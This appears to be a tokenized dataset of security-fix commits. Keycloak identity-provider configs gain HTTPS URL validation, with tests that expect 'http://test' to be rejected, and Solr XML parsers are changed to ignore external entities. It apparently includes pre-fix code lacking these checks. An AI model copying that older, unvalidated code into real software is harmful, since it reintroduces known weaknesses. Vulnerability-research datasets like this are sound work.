"*", "<", "p", ">", "Validates", "this", "configuration", ".", "*", "*", "<", "p", ">", "Sub", "-", "classes", "can", "override", "this", "method", "in", "order", "to", "enforce", "provider", "specific", "validations", ".", "*", "*", "@", "param", "realm", "the", "realm", "*", "/", "public", "void", "validate", "(", "RealmModel", "realm", ")", "{", "}", "@", "Override", "public", "OIDCIdentityProviderConfig", "createConfig", "(", ")", "{", "return", "new", "OIDCIdentityProviderConfig", "(", ");", "}", "}", "@", "@", "-", "16", ",", "7", "+", "16", ",", "12", "@", "@", "import", "static", "org", ".", "keycloak", ".", "common", ".", "util", ".", "UriUtils", ".", "checkUrl", ";", "import", "org", ".", "keycloak", ".", "common", ".", "enums", ".", "SslRequired", ";", "import", "org", ".", "keycloak", ".", "models", ".", "KeycloakSession", ";", "import", "org", ".", "keycloak", ".", "models", ".", "RealmModel", ";", "public", "OAuth2IdentityProviderConfig", "(", ")", "{", "super", "(", ");", "}", "@", "Override", "public", "void", "validate", "(", "RealmModel", "realm", ")", "{", "SslRequired", "sslRequired", "=", "realm", ".", "getSslRequired", "(", ");", "checkUrl", "(", "sslRequired", ",", "getAuthorizationUrl", "(", "),", "\"", "authorization_url", "\"", ");", "checkUrl", "(", "sslRequired", ",", "getTokenUrl", "(", "),", "\"", "token_url", "\"", ");", "checkUrl", "(", "sslRequired", ",", "getUserInfoUrl", "(", "),", "\"", "userinfo_url", "\"", ");", "}", "import", "static", "org", ".", "keycloak", ".", "common", ".", "util", ".", "UriUtils", ".", "checkUrl", ";", "import", "org", ".", "keycloak", ".", "common", ".", "enums", ".", "SslRequired", ";", "import", "org", ".", "keycloak", ".", "models", ".", "KeycloakSession", ";", "import", "org", ".", "keycloak", ".", "models", ".", "RealmModel", ";", "public", "OIDCIdentityProviderConfig", "(", ")", "{", "super", "(", ");", "}", "@", "Override", "public", "void", "validate", "(", "RealmModel", "realm", ")", "{", "super", ".", "validate", "(", "realm", ")", ";", "SslRequired", "sslRequired", "=", "realm", ".", "getSslRequired", "(", ");", "checkUrl", "(", "sslRequired", ",", "getJwksUrl", "(", "),", "\"", "jwks_url", "\"", ");", "checkUrl", "(", "sslRequired", ",", "getLogoutUrl", "(", "),", "\"", "logout_url", "\"", ");", "}", "@", "Override", "public", "OIDCIdentityProviderConfig", "createConfig", "(", ")", "{", "return", "new", "OIDCIdentityProviderConfig", "(", ");", "}", "OIDCIdentityProviderConfig", "config", "=", "new", "OIDCIdentityProviderConfig", "(", ");", "import", "static", "org", ".", "keycloak", ".", "common", ".", "util", ".", "UriUtils", ".", "checkUrl", ";", "import", "org", ".", "keycloak", ".", "common", ".", "enums", ".", "SslRequired", ";", "import", "org", ".", "keycloak", ".", "models", ".", "KeycloakSession", ";", "import", "org", ".", "keycloak", ".", "models", ".", "RealmModel", ";", "@", "Override", "public", "void", "validate", "(", "RealmModel", "realm", ")", "{", "SslRequired", "sslRequired", "=", "realm", ".", "getSslRequired", "(", ");", "checkUrl", "(", "sslRequired", ",", "getSingleLogoutServiceUrl", "(", "),", "SINGLE_LOGOUT_SERVICE_URL", ")", ";", "checkUrl", "(", "sslRequired", ",", "getSingleSignOnServiceUrl", "(", "),", "SINGLE_SIGN_ON_SERVICE_URL", ")", ";", "}", "@", "Override", "public", "SAMLIdentityProviderConfig", "createConfig", "(", ")", "{", "return", "new", "SAMLIdentityProviderConfig", "(", ");", "}", "IdentityProviderModel", "identityProvider", "=", "RepresentationToModel", ".", "toModel", "(", "realm", ",", "idpRep", ",", "session", ")", ";", "import", "static", "javax", ".", "ws", ".", "rs", ".", "core", ".", "Response", ".", "Status", ".", "BAD_REQUEST", ";", "}", "catch", "(", "IllegalArgumentException", "e", ")", "{", "return", "ErrorResponse", ".", "error", "(", "\"", "Invalid", "request", "\"", ",", "BAD_REQUEST", ")", ";", "IdentityProviderModel", "updated", "=", "RepresentationToModel", ".", "toModel", "(", "realm", ",", "providerRep", ",", "session", ")", ";", "IdentityProviderModel", "identityProvider", "=", "RepresentationToModel", ".", "toModel", "(", "realm", ",", "representation", ",", "session", ")", ";", "}", "catch", "(", "IllegalArgumentException", "e", ")", "{", "return", "ErrorResponse", ".", "error", "(", "\"", "Invalid", "request", "\"", ",", "BAD_REQUEST", ")", ";", "@", "Override", "public", "OAuth2IdentityProviderConfig", "createConfig", "(", ")", "{", "return", "new", "OAuth2IdentityProviderConfig", "(", ");", "}", "@", "Override", "public", "OAuth2IdentityProviderConfig", "createConfig", "(", ")", "{", "return", "new", "OAuth2IdentityProviderConfig", "(", ");", "}", "@", "Override", "public", "OAuth2IdentityProviderConfig", "createConfig", "(", ")", "{", "return", "new", "OAuth2IdentityProviderConfig", "(", ");", "}", "@", "Override", "public", "OIDCIdentityProviderConfig", "createConfig", "(", ")", "{", "return", "new", "OIDCIdentityProviderConfig", "(", ");", "}", "public", "GoogleIdentityProviderConfig", "(", ")", "{", "}", "@", "Override", "public", "GoogleIdentityProviderConfig", "createConfig", "(", ")", "{", "return", "new", "GoogleIdentityProviderConfig", "(", ");", "}", "@", "Override", "public", "OAuth2IdentityProviderConfig", "createConfig", "(", ")", "{", "return", "new", "OAuth2IdentityProviderConfig", "(", ");", "}", "@", "Override", "public", "OAuth2IdentityProviderConfig", "createConfig", "(", ")", "{", "return", "new", "OAuth2IdentityProviderConfig", "(", ");", "}", "@", "Override", "public", "OAuth2IdentityProviderConfig", "createConfig", "(", ")", "{", "return", "new", "OAuth2IdentityProviderConfig", "(", ");", "}", "public", "OpenshiftV3IdentityProviderConfig", "(", ")", "{", "}", "@", "Override", "public", "OpenshiftV3IdentityProviderConfig", "createConfig", "(", ")", "{", "return", "new", "OpenshiftV3IdentityProviderConfig", "(", ");", "}", "public", "OpenshiftV4IdentityProviderConfig", "(", ")", "{", "}", "@", "Override", "public", "OpenshiftV4IdentityProviderConfig", "createConfig", "(", ")", "{", "return", "new", "OpenshiftV4IdentityProviderConfig", "(", ");", "}", "public", "PayPalIdentityProviderConfig", "(", ")", "{", "}", "@", "Override", "public", "PayPalIdentityProviderConfig", "createConfig", "(", ")", "{", "return", "new", "PayPalIdentityProviderConfig", "(", ");", "}", "public", "StackOverflowIdentityProviderConfig", "(", ")", "{", "}", "public", "String", "getKey", "(", ")", "{", "@", "Override", "public", "StackOverflowIdentityProviderConfig", "createConfig", "(", ")", "{", "return", "new", "StackOverflowIdentityProviderConfig", "(", ");", "}", "@", "Override", "public", "OAuth2IdentityProviderConfig", "createConfig", "(", ")", "{", "return", "new", "OAuth2IdentityProviderConfig", "(", ");", "}", "import", "org", ".", "hamcrest", ".", "Matchers", ";", "import", "org", ".", "junit", ".", "Rule", ";", "import", "org", ".", "junit", ".", "rules", ".", "ExpectedException", ";", "import", "org", ".", "keycloak", ".", "common", ".", "enums", ".", "SslRequired", ";", "import", "org", ".", "keycloak", ".", "representations", ".", "idm", ".", "RealmRepresentation", ";", "import", "org", ".", "keycloak", ".", "testsuite", ".", "broker", ".", "OIDCIdentityProviderConfigRep", ";", "import", "javax", ".", "ws", ".", "rs", ".", "ClientErrorException", ";", "import", "java", ".", "util", ".", "UUID", ";", "import", "static", "org", ".", "keycloak", ".", "testsuite", ".", "arquillian", ".", "AuthServerTestEnricher", ".", "AUTH_SERVER_SSL_REQUIRED", ";", "+", "\"", "vOU8TyqfZF5jpv0IcrviLl", "/", "DoFrbjByeHR", "+", "pu", "/", "vClcAOjL", "/", "u7oQELuuTfNsBI4tpexUj5G8q", "/", "YbEz0gk7idf", "\"", "+", "\"", "LXrAUVcsR73oTngrhRfwUSmPrjjK0kjcRb6HL9V", "/", "+", "wh3R", "/", "6mEd59U08ExT8N38rhmn0CI3ehMdebReprP7U8", "=", "\";", "@", "Rule", "public", "ExpectedException", "expectedException", "=", "ExpectedException", ".", "none", "(", ");", "@", "Test", "public", "void", "failCreateInvalidUrl", "(", ")", "{", "RealmRepresentation", "realmRep", "=", "realm", ".", "toRepresentation", "(", ");", "realmRep", ".", "setSslRequired", "(", "SslRequired", ".", "ALL", ".", "name", "(", "))", ";", "try", "{", "realm", ".", "update", "(", "realmRep", ")", ";", "IdentityProviderRepresentation", "newIdentityProvider", "=", "createRep", "(", "\"", "new", "-", "identity", "-", "provider", "\"", ",", "\"", "oidc", "\"", ");", "newIdentityProvider", ".", "getConfig", "(", ").", "put", "(", "\"", "clientId", "\"", ",", "\"", "clientId", "\"", ");", "newIdentityProvider", ".", "getConfig", "(", ").", "put", "(", "\"", "clientSecret", "\"", ",", "\"", "some", "secret", "value", "\"", ");", "OIDCIdentityProviderConfigRep", "oidcConfig", "=", "new", "OIDCIdentityProviderConfigRep", "(", "newIdentityProvider", ")", ";", "oidcConfig", ".", "setAuthorizationUrl", "(", "\"", "invalid", ":", "//", "test", "\"", ");", "try", "(", "Response", "response", "=", "this", ".", "realm", ".", "identityProviders", "(", ").", "create", "(", "newIdentityProvider", ")", ")", "{", "assertEquals", "(", "AUTH_SERVER_SSL_REQUIRED", "?", "Response", ".", "Status", ".", "BAD_REQUEST", ".", "getStatusCode", "(", ")", ":", "Response", ".", "Status", ".", "CREATED", ".", "getStatusCode", "(", "),", "response", ".", "getStatus", "(", "))", ";", "}", "oidcConfig", ".", "setAuthorizationUrl", "(", "null", ")", ";", "oidcConfig", ".", "setTokenUrl", "(", "\"", "http", ":", "//", "test", "\"", ");", "try", "(", "Response", "response", "=", "this", ".", "realm", ".", "identityProviders", "(", ").", "create", "(", "newIdentityProvider", ")", ")", "{", "assertEquals", "(", "AUTH_SERVER_SSL_REQUIRED", "?", "Response", ".", "Status", ".", "BAD_REQUEST", ".", "getStatusCode", "(", ")", ":", "Response", ".", "Status", ".", "CREATED", ".", "getStatusCode", "(", "),", "response", ".", "getStatus", "(", "))", ";", "}", "oidcConfig", ".", "setAuthorizationUrl", "(", "null", ")", ";", "oidcConfig", ".", "setTokenUrl", "(", "null", ")", ";", "oidcConfig", ".", "setJwksUrl", "(", "\"", "http", ":", "//", "test", "\"", ");", "try", "(", "Response", "response", "=", "this", ".", "realm", ".", "identityProviders", "(", ").", "create", "(", "newIdentityProvider", ")", ")", "{", "assertEquals", "(", "AUTH_SERVER_SSL_REQUIRED", "?", "Response", ".", "Status", ".", "BAD_REQUEST", ".", "getStatusCode", "(", ")", ":", "Response", ".", "Status", ".", "CREATED", ".", "getStatusCode", "(", "),", "response", ".", "getStatus", "(", "))", ";", "}", "oidcConfig", ".", "setAuthorizationUrl", "(", "null", ")", ";", "oidcConfig", ".", "setTokenUrl", "(", "null", ")", ";", "oidcConfig", ".", "setJwksUrl", "(", "null", ")", ";", "oidcConfig", ".", "setLogoutUrl", "(", "\"", "http", ":", "//", "test", "\"", ");", "try", "(", "Response", "response", "=", "this", ".", "realm", ".", "identityProviders", "(", ").", "create", "(", "newIdentityProvider", ")", ")", "{", "assertEquals", "(", "AUTH_SERVER_SSL_REQUIRED", "?", "Response", ".", "Status", ".", "BAD_REQUEST", ".", "getStatusCode", "(", ")", ":", "Response", ".", "Status", ".", "CREATED", ".", "getStatusCode", "(", "),", "response", ".", "getStatus", "(", "))", ";", "}", "oidcConfig", ".", "setAuthorizationUrl", "(", "null", ")", ";", "oidcConfig", ".", "setTokenUrl", "(", "null", ")", ";", "oidcConfig", ".", "setJwksUrl", "(", "null", ")", ";", "oidcConfig", ".", "setLogoutUrl", "(", "null", ")", ";", "oidcConfig", ".", "setUserInfoUrl", "(", "\"", "http", ":", "//", "test", "\"", ");", "try", "(", "Response", "response", "=", "this", ".", "realm", ".", "identityProviders", "(", ").", "create", "(", "newIdentityProvider", ")", ")", "{", "assertEquals", "(", "AUTH_SERVER_SSL_REQUIRED", "?", "Response", ".", "Status", ".", "BAD_REQUEST", ".", "getStatusCode", "(", ")", ":", "Response", ".", "Status", ".", "CREATED", ".", "getStatusCode", "(", "),", "response", ".", "getStatus", "(", "))", ";", "}", "}", "finally", "{", "realmRep", ".", "setSslRequired", "(", "SslRequired", ".", "NONE", ".", "name", "(", "))", ";", "realm", ".", "update", "(", "realmRep", ")", ";", "}", "}", "@", "Test", "public", "void", "failUpdateInvalidUrl", "(", ")", "{", "RealmRepresentation", "realmRep", "=", "realm", ".", "toRepresentation", "(", ");", "realmRep", ".", "setSslRequired", "(", "SslRequired", ".", "ALL", ".", "name", "(", "))", ";", "try", "{", "realm", ".", "update", "(", "realmRep", ")", ";", "IdentityProviderRepresentation", "representation", "=", "createRep", "(", "UUID", ".", "randomUUID", "(", ").", "toString", "(", "),", "\"", "oidc", "\"", ");", "representation", ".", "getConfig", "(", ").", "put", "(", "\"", "clientId", "\"", ",", "\"", "clientId", "\"", ");", "representation", ".", "getConfig", "(", ").", "put", "(", "\"", "clientSecret", "\"", ",", "\"", "some", "secret", "value", "\"", ");", "try", "(", "Response", "response", "=", "realm", ".", "identityProviders", "(", ").", "create", "(", "representation", ")", ")", "{", "assertEquals", "(", "Response", ".", "Status", ".", "CREATED", ".", "getStatusCode", "(", "),", "response", ".", "getStatus", "(", "))", ";", "}", "IdentityProviderResource", "resource", "=", "this", ".", "realm", ".", "identityProviders", "(", ").", "get", "(", "representation", ".", "getAlias", "(", "))", ";", "representation", "=", "resource", ".", "toRepresentation", "(", ");", "OIDCIdentityProviderConfigRep", "oidcConfig", "=", "new", "OIDCIdentityProviderConfigRep", "(", "representation", ")", ";", "oidcConfig", ".", "setAuthorizationUrl", "(", "\"", "invalid", ":", "//", "test", "\"", ");", "this", ".", "expectedException", ".", "expect", "(", "Matchers", ".", "allOf", "(", "Matchers", ".", "instanceOf", "(", "ClientErrorException", ".", "class", ")", ",", "Matchers", ".", "hasProperty", "(", "\"", "response", "\"", ",", "Matchers", ".", "hasProperty", "(", "\"", "status", "\"", ",", "Matchers", ".", "is", "(", "Response", ".", "Status", ".", "BAD_REQUEST", ".", "getStatusCode", "(", "))", "))", "))", ";", "resource", ".", "update", "(", "representation", ")", ";", "oidcConfig", ".", "setAuthorizationUrl", "(", "null", ")", ";", "oidcConfig", ".", "setTokenUrl", "(", "\"", "http", ":", "//", "test", "\"", ");", "this", ".", "expectedException", ".", "expect", "(", "Matchers", ".", "allOf", "(", "Matchers", ".", "instanceOf", "(", "ClientErrorException", ".", "class", ")", ",", "Matchers", ".", "hasProperty", "(", "\"", "response", "\"", ",", "Matchers", ".", "hasProperty", "(", "\"", "status", "\"", ",", "Matchers", ".", "is", "(", "Response", ".", "Status", ".", "BAD_REQUEST", ".", "getStatusCode", "(", "))", "))", "))", ";", "resource", ".", "update", "(", "representation", ")", ";", "oidcConfig", ".", "setAuthorizationUrl", "(", "null", ")", ";", "oidcConfig", ".", "setTokenUrl", "(", "null", ")", ";", "oidcConfig", ".", "setJwksUrl", "(", "\"", "http", ":", "//", "test", "\"", ");", "this", ".", "expectedException", ".", "expect", "(", "Matchers", ".", "allOf", "(", "Matchers", ".", "instanceOf", "(", "ClientErrorException", ".", "class", ")", ",", "Matchers", ".", "hasProperty", "(", "\"", "response", "\"", ",", "Matchers", ".", "hasProperty", "(", "\"", "status", "\"", ",", "Matchers", ".", "is", "(", "Response", ".", "Status", ".", "BAD_REQUEST", ".", "getStatusCode", "(", "))", "))", "))", ";", "resource", ".", "update", "(", "representation", ")", ";", "oidcConfig", ".", "setAuthorizationUrl", "(", "null", ")", ";", "oidcConfig", ".", "setTokenUrl", "(", "null", ")", ";", "oidcConfig", ".", "setJwksUrl", "(", "null", ")", ";", "oidcConfig", ".", "setLogoutUrl", "(", "\"", "http", ":", "//", "test", "\"", ");", "this", ".", "expectedException", ".", "expect", "(", "Matchers", ".", "allOf", "(", "Matchers", ".", "instanceOf", "(", "ClientErrorException", ".", "class", ")", ",", "Matchers", ".", "hasProperty", "(", "\"", "response", "\"", ",", "Matchers", ".", "hasProperty", "(", "\"", "status", "\"", ",", "Matchers", ".", "is", "(", "Response", ".", "Status", ".", "BAD_REQUEST", ".", "getStatusCode", "(", "))", "))", "))", ";", "resource", ".", "update", "(", "representation", ")", ";", "oidcConfig", ".", "setAuthorizationUrl", "(", "null", ")", ";", "oidcConfig", ".", "setTokenUrl", "(", "null", ")", ";", "oidcConfig", ".", "setJwksUrl", "(", "null", ")", ";", "oidcConfig", ".", "setLogoutUrl", "(", "null", ")", ";", "oidcConfig", ".", "setUserInfoUrl", "(", "\"", "http", ":", "//", "test", "\"", ");", "this", ".", "expectedException", ".", "expect", "(", "Matchers", ".", "allOf", "(", "Matchers", ".", "instanceOf", "(", "ClientErrorException", ".", "class", ")", ",", "Matchers", ".", "hasProperty", "(", "\"", "response", "\"", ",", "Matchers", ".", "hasProperty", "(", "\"", "status", "\"", ",", "Matchers", ".", "is", "(", "Response", ".", "Status", ".", "BAD_REQUEST", ".", "getStatusCode", "(", "))", "))", "))", ";", "resource", ".", "update", "(", "representation", ")", ";", "}", "finally", "{", "realmRep", ".", "setSslRequired", "(", "SslRequired", ".", "NONE", ".", "name", "(", "))", ";", "realm", ".", "update", "(", "realmRep", ")", ";", "}", "}", "response", ".", "set", "(", "realm", ".", "identityProviders", "(", ").", "create", "(", "IdentityProviderBuilder", ".", "create", "(", ").", "providerId", "(", "\"", "oidc", "\"", ")", ".", "displayName", "(", "\"", "nosuch", "-", "foo", "\"", ").", "alias", "(", "\"", "foo", "\"", ").", "setAttribute", "(", "\"", "clientId", "\"", ",", "\"", "foo", "\"", ").", "setAttribute", "(", "\"", "clientSecret", "\"", ",", "\"", "foo", "\"", ").", "build", "(", "))", ");", "rep", ".", "setProviderId", "(", "\"", "oidc", "\"", ");", "cfg", ".", "setJwksUrl", "(", "\"", "https", ":", "//", "localhost", ":", "43214", "/", "non", "-", "existent", "\"", ");", "public", "class", "OIDCIdentityProviderConfigRep", "extends", "OIDCIdentityProviderConfig", "{", ".", "setAttribute", "(", "SAMLIdentityProviderConfig", ".", "SINGLE_SIGN_ON_SERVICE_URL", ",", "\"", "https", ":", "//", "saml", ".", "idp", "/", "saml", "\"", ")", ".", "setAttribute", "(", "SAMLIdentityProviderConfig", ".", "SINGLE_LOGOUT_SERVICE_URL", ",", "\"", "https", ":", "//", "saml", ".", "idp", "/", "saml", "\"", ")", ".", "issuer", "(", "\"", "https", ":", "//", "saml", ".", "idp", "/", "saml", "\"", ")", "try", "(", "IdentityProviderCreator", "idp", "=", "new", "IdentityProviderCreator", "(", "realm", ",", "addIdentityProvider", "(", "\"", "https", ":", "//", "saml", ".", "idp", "/", "saml", "\"", "))", ")", "{", "try", "(", "IdentityProviderCreator", "idp", "=", "new", "IdentityProviderCreator", "(", "realm", ",", "addIdentityProvider", "(", "\"", "https", ":", "//", "saml", ".", "idp", "/", "?", "service", "=", "name", "&", "serviceType", "=", "prod", "\"", "))", ")", "{", "assertThat", "(", "ar", ".", "getDestination", "(", "),", "Matchers", ".", "equalTo", "(", "URI", ".", "create", "(", "\"", "https", ":", "//", "saml", ".", "idp", "/", "?", "service", "=", "name", "&", "serviceType", "=", "prod", "\"", "))", ");", "assertThat", "(", "headers", "[", "0", "]", ".", "getValue", "(", "),", "Matchers", ".", "containsString", "(", "\"", "https", ":", "//", "saml", ".", "idp", "/", "?", "service", "=", "name", "&", "serviceType", "=", "prod", "\"", "))", ";", "try", "(", "IdentityProviderCreator", "idp", "=", "new", "IdentityProviderCreator", "(", "realm", ",", "addIdentityProvider", "(", "\"", "https", ":", "//", "saml", ".", "idp", "/", "\")", "))", "{", ".", "setAttribute", "(", "SAMLIdentityProviderConfig", ".", "SINGLE_SIGN_ON_SERVICE_URL", ",", "\"", "https", ":", "//", "saml", "-", "idp", "-", "sso", "-", "service", "/", "\")", "private", "static", "final", "String", "BROKER_SIGN_ON_SERVICE_URL", "=", "\"", "https", ":", "//", "saml", ".", "idp", "/", "saml", "\"", ";", "private", "static", "final", "String", "BROKER_LOGOUT_SERVICE_URL", "=", "\"", "https", ":", "//", "saml", ".", "idp", "/", "SLO", "/", "saml", "\"", ";", "private", "static", "final", "String", "BROKER_SERVICE_ID", "=", "\"", "https", ":", "//", "saml", ".", "idp", "/", "saml", "\"", ";", "\"", "singleLogoutServiceUrl", "\"", ":", "\"", "https", ":", "//", "saml", ".", "idp", "/", "saml", "\"", ",", "\"", "singleSignOnServiceUrl", "\"", ":", "\"", "https", ":", "//", "saml", ".", "idp", "/", "saml", "\"", ",</s>importIdentityProviders", "(", "rep", ",", "newRealm", ")", ";", "private", "static", "void", "importIdentityProviders", "(", "RealmRepresentation", "rep", ",", "RealmModel", "newRealm", ")", "{", "newRealm", ".", "addIdentityProvider", "(", "toModel", "(", "newRealm", ",", "representation", ")", ");", "public", "static", "IdentityProviderModel", "toModel", "(", "RealmModel", "realm", ",", "IdentityProviderRepresentation", "representation", ")", "{", "IdentityProviderModel", "identityProviderModel", "=", "new", "IdentityProviderModel", "(", ");", "}", "OIDCIdentityProviderConfig", "config", "=", "new", "OIDCIdentityProviderConfig", "(", "new", "IdentityProviderModel", "(", "))", ";", "IdentityProviderModel", "identityProvider", "=", "RepresentationToModel", ".", "toModel", "(", "realm", ",", "idpRep", ")", ";", "IdentityProviderModel", "updated", "=", "RepresentationToModel", ".", "toModel", "(", "realm", ",", "providerRep", ")", ";", "IdentityProviderModel", "identityProvider", "=", "RepresentationToModel", ".", "toModel", "(", "realm", ",", "representation", ")", ";", "import", "org", ".", "keycloak", ".", "broker", ".", "oidc", ".", "OAuth2IdentityProviderConfig", ";", "import", "org", ".", "keycloak", ".", "broker", ".", "oidc", ".", "OIDCIdentityProviderConfig", ";", "public", "String", "getKey", "(", ")", "{", "response", ".", "set", "(", "realm", ".", "identityProviders", "(", ").", "create", "(", "IdentityProviderBuilder", ".", "create", "(", ").", "providerId", "(", "\"", "nosuch", "\"", ")", ".", "displayName", "(", "\"", "nosuch", "-", "foo", "\"", ").", "alias", "(", "\"", "foo", "\"", ").", "build", "(", "))", ");", "rep", ".", "setProviderId", "(", "\"", "social", "-", "provider", "-", "type", "\"", ");", "cfg", ".", "setJwksUrl", "(", "\"", "http", ":", "//", "localhost", ":", "43214", "/", "non", "-", "existent", "\"", ");", "class", "OIDCIdentityProviderConfigRep", "extends", "OIDCIdentityProviderConfig", "{", ".", "setAttribute", "(", "SAMLIdentityProviderConfig", ".", "SINGLE_SIGN_ON_SERVICE_URL", ",", "\"", "http", ":", "//", "saml", ".", "idp", "/", "saml", "\"", ")", ".", "setAttribute", "(", "SAMLIdentityProviderConfig", ".", "SINGLE_LOGOUT_SERVICE_URL", ",", "\"", "http", ":", "//", "saml", ".", "idp", "/", "saml", "\"", ")", ".", "issuer", "(", "\"", "http", ":", "//", "saml", ".", "idp", "/", "saml", "\"", ")", "try", "(", "IdentityProviderCreator", "idp", "=", "new", "IdentityProviderCreator", "(", "realm", ",", "addIdentityProvider", "(", "\"", "http", ":", "//", "saml", ".", "idp", "/", "saml", "\"", "))", ")", "{", "try", "(", "IdentityProviderCreator", "idp", "=", "new", "IdentityProviderCreator", "(", "realm", ",", "addIdentityProvider", "(", "\"", "http", ":", "//", "saml", ".", "idp", "/", "?", "service", "=", "name", "&", "serviceType", "=", "prod", "\"", "))", ")", "{", "assertThat", "(", "ar", ".", "getDestination", "(", "),", "Matchers", ".", "equalTo", "(", "URI", ".", "create", "(", "\"", "http", ":", "//", "saml", ".", "idp", "/", "?", "service", "=", "name", "&", "serviceType", "=", "prod", "\"", "))", ");", "assertThat", "(", "headers", "[", "0", "]", ".", "getValue", "(", "),", "Matchers", ".", "containsString", "(", "\"", "http", ":", "//", "saml", ".", "idp", "/", "?", "service", "=", "name", "&", "serviceType", "=", "prod", "\"", "))", ";", "try", "(", "IdentityProviderCreator", "idp", "=", "new", "IdentityProviderCreator", "(", "realm", ",", "addIdentityProvider", "(", "\"", "http", ":", "//", "saml", ".", "idp", "/", "\")", "))", "{", ".", "setAttribute", "(", "SAMLIdentityProviderConfig", ".", "SINGLE_SIGN_ON_SERVICE_URL", ",", "\"", "http", ":", "//", "saml", "-", "idp", "-", "sso", "-", "service", "/", "\")", "private", "static", "final", "String", "BROKER_SIGN_ON_SERVICE_URL", "=", "\"", "http", ":", "//", "saml", ".", "idp", "/", "saml", "\"", ";", "private", "static", "final", "String", "BROKER_LOGOUT_SERVICE_URL", "=", "\"", "http", ":", "//", "saml", ".", "idp", "/", "SLO", "/", "saml", "\"", ";", "private", "static", "final", "String", "BROKER_SERVICE_ID", "=", "\"", "http", ":", "//", "saml", ".", "idp", "/", "saml", "\"", ";", "\"", "singleLogoutServiceUrl", "\"", ":", "\"", "http", ":", "//", "saml", ".", "idp", "/", "saml", "\"", ",", "\"", "singleSignOnServiceUrl", "\"", ":", "\"", "http", ":", "//", "saml", ".", "idp", "/", "saml", "\"", ","], "docstring_tokens": ["craft", "deep", "links", "that", "introduce", "further", "attack", "scenarios", "on", "affected", "clients", "."]}
{"contents": ["SOLR-3895,", "SOLR-3614:", "XML", "and", "XSLT", "UpdateRequestHandler", "should", "not", "try", "to", "resolve", "external", "entities;", "fix", "XML", "parsing", "in", "XPathEntityProcessor", "to", "correctly", "expand", "named", "entities,", "but", "ignore", "external", "entities", "git-svn-id:", "https://svn.apache.org/repos/asf/lucene/dev/trunk@1390921", "13f79535-47bb-0310-9956-ffa450edef68"], "code_tokens": ["*", "SOLR", "-", "3895", ":", "XML", "and", "XSLT", "UpdateRequestHandler", "should", "not", "try", "to", "resolve", "external", "entities", ".", "This", "improves", "speed", "of", "loading", "e", ".", "g", ".", "XSL", "-", "transformed", "XHTML", "documents", ".", "(", "Martin", "Herfurt", ",", "uschindler", ",", "hossman", ")", "*", "SOLR", "-", "3614", ":", "Fix", "XML", "parsing", "in", "XPathEntityProcessor", "to", "correctly", "expand", "named", "entities", ",", "but", "ignore", "external", "entities", ".", "(", "uschindler", ",", "hossman", ")", "import", "org", ".", "apache", ".", "solr", ".", "util", ".", "EmptyEntityResolver", ";", "static", "{", "EmptyEntityResolver", ".", "configureXMLInputFactory", "(", "factory", ")", ";", "try", "{", "/", "/", "The", "java", "1", ".", "6", "bundled", "stax", "parser", "(", "sjsxp", ")", "does", "not", "currently", "have", "a", "thread", "-", "safe", "/", "/", "XMLInputFactory", ",", "as", "that", "implementation", "tries", "to", "cache", "and", "reuse", "the", "/", "/", "XMLStreamReader", ".", "Setting", "the", "parser", "-", "specific", "\"", "reuse", "-", "instance", "\"", "property", "to", "false", "/", "/", "prevents", "this", ".", "/", "/", "All", "other", "known", "open", "-", "source", "stax", "parsers", "(", "and", "the", "bea", "ref", "impl", ")", "/", "/", "have", "thread", "-", "safe", "factories", ".", "factory", ".", "setProperty", "(", "\"", "reuse", "-", "instance", "\"", ",", "Boolean", ".", "FALSE", ")", ";", "}", "catch", "(", "IllegalArgumentException", "ex", ")", "{", "/", "/", "Other", "implementations", "will", "likely", "throw", "this", "exception", "since", "\"", "reuse", "-", "instance", "\"", "/", "/", "isimplementation", "specific", ".", "LOG", ".", "debug", "(", "\"", "Unable", "to", "set", "the", "'", "reuse", "-", "instance", "'", "property", "for", "the", "input", "chain", ":", "\"", "+", "factory", ")", ";", "}", "List", "l", "=", "(", "List", ")", "result", ".", "get", "(", "0", ")", ".", "get", "(", "\"", "a", "\"", ");", "assertEquals", "(", "3", ",", "l", ".", "size", "(", "))", ";", "assertEquals", "(", "\"", "1", "\"", ",", "l", ".", "get", "(", "0", ")", ");", "assertEquals", "(", "\"", "2", "\"", ",", "l", ".", "get", "(", "1", ")", ");", "assertEquals", "(", "\"\u00fc", "\",", "l", ".", "get", "(", "2", ")", ");", "+", "\"", "\\", "t", "\\", "t", "<", "price", ">", "9", ".", "90", "<", "/", "price", ">", "\\", "n", "\"", "+", "\"", "\\", "t", "\\", "t", "<", "year", ">", "1982", "<", "/", "year", ">", "\\", "n", "\"", "+", "\"", "\\", "t", "<", "/", "cd", ">", "\\", "n", "\"", "+", "\"", "</", "catalog", ">", "\\", "t", "\"", ";", "private", "static", "final", "String", "testXml", "=", "\"", "<?", "xml", "version", "=", "\\\"", "1", ".", "0", "\\", "\"", "encoding", "=", "\\\"", "UTF", "-", "8", "\\", "\"?", ">\\", "n", "<", "!", "DOCTYPE", "root", "[", "\\", "n", "<", "!", "ENTITY", "uuml", "\\", "\"&", "#", "252", ";", "\\\"", ">", "\\", "n", "]", ">\\", "n", "<", "root", ">", "<", "a", ">", "1", "<", "/", "a", ">", "<", "a", ">", "2", "<", "/", "a", ">", "<", "a", ">", "&", "uuml", ";", "</", "a", ">", "</", "root", ">", "\";", "import", "org", ".", "apache", ".", "solr", ".", "util", ".", "EmptyEntityResolver", ";", "import", "org", ".", "xml", ".", "sax", ".", "XMLReader", ";", "import", "javax", ".", "xml", ".", "parsers", ".", "SAXParserFactory", ";", "SAXParserFactory", "saxFactory", ";", "/", "/", "Init", "StAX", "parser", ":", "EmptyEntityResolver", ".", "configureXMLInputFactory", "(", "inputFactory", ")", ";", "inputFactory", ".", "setXMLReporter", "(", "xmllog", ")", ";", "}", "catch", "(", "IllegalArgumentException", "ex", ")", "{", "/", "/", "Init", "SAX", "parser", "(", "for", "XSL", ")", ":", "saxFactory", "=", "SAXParserFactory", ".", "newInstance", "(", ");", "saxFactory", ".", "setNamespaceAware", "(", "true", ")", ";", "/", "/", "XSL", "needs", "this", "!", "EmptyEntityResolver", ".", "configureSAXParserFactory", "(", "saxFactory", ")", ";", "final", "Transformer", "t", "=", "getTransformer", "(", "tr", ",", "req", ")", ";", "final", "XMLReader", "xmlr", "=", "saxFactory", ".", "newSAXParser", "(", ").", "getXMLReader", "(", ");", "xmlr", ".", "setErrorHandler", "(", "xmllog", ")", ";", "xmlr", ".", "setEntityResolver", "(", "EmptyEntityResolver", ".", "SAX_INSTANCE", ")", ";", "final", "SAXSource", "source", "=", "new", "SAXSource", "(", "xmlr", ",", "isrc", ")", ";", "/", "/", "second", "step", ":", "feed", "the", "intermediate", "DOM", 